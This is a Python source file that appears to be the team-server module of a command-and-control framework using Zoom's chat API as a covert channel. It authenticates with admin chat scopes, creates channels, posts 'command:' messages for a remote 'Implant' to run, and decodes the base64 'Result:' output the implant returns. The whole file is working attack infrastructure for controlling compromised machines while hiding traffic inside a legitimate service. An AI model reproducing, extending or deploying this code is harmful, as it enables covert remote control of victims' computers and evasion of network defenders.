import binascii

import requests
import json
import base64
from termcolor import colored
from pynput.keyboard import Key, Controller
from .ManageDatabase import ManageDatabase


DB = ManageDatabase()
DB.ConnectDatabase()


class ZoomAPI:
    def __init__(self):
        self.GenerateTokenUrl = "https://zoom.us/oauth/token"
        self.UpdateMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages/MESSAGE_ID"
        self.CreateChannelUrl = "https://api.zoom.us/v2/chat/users/me/channels"
        self.RecvMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages?to_channel=CHANNEL"
        with open("TeamServer/TeamServerConfig.json", "r") as ConfigFile:
            Configuration = json.load(ConfigFile)
            ConfigFile.close()
        self.AccountID = Configuration['Account_ID']
        self.ClientID = Configuration['Client_ID']
        self.ClientSecret = Configuration['Client_Secret']
        self.Email = Configuration['Email']

        self.AccessToken = self.GenerateToken()

    def GenerateToken(self):
        RequiredPermissions = [
            "chat_message:write:admin",
            "chat_channel:write:admin",
            "chat_channel:read:admin",
            "chat_message:read:admin"
        ]

        Auth_Token = base64.b64encode(f"{self.ClientID}:{self.ClientSecret}".encode()).decode()
        headers = {
            'Host': 'zoom.us',
            'Authorization': f'Basic {Auth_Token}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        data = {
            'grant_type': 'account_credentials',
            'account_id': f'{self.AccountID}',
        }

        response = requests.post(self.GenerateTokenUrl, headers=headers, data=data)
        JsonResponse = response.json()
        try:
            AccessToken = JsonResponse['access_token']
            Scope = JsonResponse['scope'].split()
            for permission in RequiredPermissions:
                if permission not in Scope:
                    return "Please Provide All Required Permission\n"
                else:
                    pass

            return AccessToken
        except KeyError:
            try:
                ErrorMessage = f"No Access Token Found\nError: '{JsonResponse['errorMessage']}'"
                return ErrorMessage
            except KeyError:
                ErrorMessage = f"No Access Token Found\nError: {response.text}"
                return ErrorMessage

    def CreateChannel(self, AccessToken, Name):
        headers = {
            'Authorization': f'Bearer {AccessToken}',
            'Content-Type': 'application/json'
        }
        payload = {
            "members": [
                {
                    "email": f"{self.Email}"
                }
            ],
            "name": f"{Name}",
            "type": 1
        }
        try:
            response = requests.post(self.CreateChannelUrl, headers=headers, json=payload)
        except requests.exceptions.InvalidHeader as e:
            ErrorMessage = f"Failed to create channel. Error: {e}"
            return ErrorMessage
        if response.status_code == 201:
            channel_data = response.json()
            channel_id = channel_data['id']
            return channel_id
        else:
            ErrorMessage = f"Failed to create channel. Error code: {response.status_code}\nError message: {response.text}"
            return ErrorMessage

    def UpdateMessage(self, AccessToken, ChannelID, MessageID, Command, IsACommand=None):

        url = self.UpdateMessageUrl.replace("MESSAGE_ID", MessageID)
        headers = {
            'Authorization': f'Bearer {AccessToken}',
            'Content-Type': 'application/json'
        }
        if IsACommand is None:
            data = {
                "message": f"command: {Command}",
                "to_channel": f"{ChannelID}"
            }
        else:
            data = {
                "message": f"{IsACommand} {Command}",
                "to_channel": f"{ChannelID}"
            }
        response = requests.put(url, headers=headers, json=data)
        if response.text == "":
            return "Message Updated!"
        else:
            return f"Cannot update the latest messages\nError: {response.text}"

    def RecvMessage(self, AccessToken, ChannelID):
        url = self.RecvMessageUrl.replace('CHANNEL', ChannelID)
        headers = {
            'Authorization': f'Bearer {AccessToken}',
            'Content-Type': 'application/json'
        }
        response = requests.get(url, headers=headers)
        jResponse = response.json()
        try:
            try:
                message_ids = [message['id'] for message in jResponse['messages']]
                message = [message['message'] for message in jResponse['messages']]
                MainMessage = message[0]
                ChannelName = DB.QueryChannelByID(ChannelID)
                if MainMessage == "Implant Checked In!" or MainMessage == " Command Executed.":
                    return message_ids[0], MainMessage
                elif MainMessage[:8] == "Result: ":
                    output = MainMessage[8:]
                    self.UpdateMessage(AccessToken, ChannelID, message_ids[0], "Command Executed.", IsACommand="")
                    try:
                        output = base64.b64decode(output.encode()).decode()
                    except UnicodeDecodeError:
                        output = output.replace('|', '\n')
                    except __import__('binascii').Error:
                        output = output.replace('|', '\n')
                    print(colored(f"\nCommand Executed at {ChannelName[0]}: {colored(output, 'blue')}", 'green'))
                    Controller().press(Key.enter)
                    Controller().release(Key.enter)
                    return message_ids[0], MainMessage
                elif MainMessage[:9] == "command: " and MainMessage[:13] != "command: exit":
                    return message_ids[0], "Command already In Queue"
                else:
                    return f"Implant is Not Yet checked In!\nLatest Message: {MainMessage}", None
            except KeyError:
                return f"Implant is Not Yet checked In!\nError: {jResponse}", None
        except IndexError:
            return f"Implant is Not Yet checked In!\nError: {jResponse}", None
